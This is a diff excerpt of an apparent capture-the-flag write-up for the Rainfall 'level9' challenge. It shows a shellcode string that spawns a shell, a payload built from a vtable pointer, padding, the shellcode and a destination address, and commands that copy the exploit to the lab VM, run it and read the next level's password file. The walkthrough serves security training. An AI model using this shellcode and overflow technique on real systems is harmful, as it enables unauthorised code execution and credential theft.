@@ -75,4 +75,13 @@ shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\
 print vtable + padding + shellcode + destination
 ```
 
-TODO final step
+```shell
+# On host machine:
+scp -P 4242 Resources/exploit.py level9@$RAIN:/tmp/exploit.py
+
+# On the Rainfall VM:
+chmod +x /tmp/exploit.py
+./level9 $(/tmp/exploit.py)
+$ cat /home/user/bonus0/.pass
+[redacted]
+```
